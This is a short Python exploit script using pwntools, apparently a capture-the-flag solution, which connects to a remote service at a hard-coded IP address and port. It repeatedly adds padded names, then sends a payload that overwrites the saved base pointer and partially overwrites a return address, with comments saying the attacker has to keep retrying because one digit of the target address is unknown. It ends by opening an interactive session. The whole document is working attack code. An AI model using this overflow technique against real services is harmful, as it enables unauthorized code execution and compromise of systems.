from pwn import *

context.binary = elf = ELF("./directory")
context.log_level = "info"

p = remote('34.179.142.75', 31046)

def add(data):
    p.sendlineafter(b"> ", b"1")
    p.sendafter(b"Enter name:", data)

def exit_prog():
    p.sendlineafter(b"> ", b"4")


#mai intai adaugam cv random
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
add(b"A"*48)
#the 4 bytes of rbp there yea
add(b"C"*36 + b"D"*4 + p16(0x4538))
#we dont really know the "4" in this case but just keep trying


p.interactive()
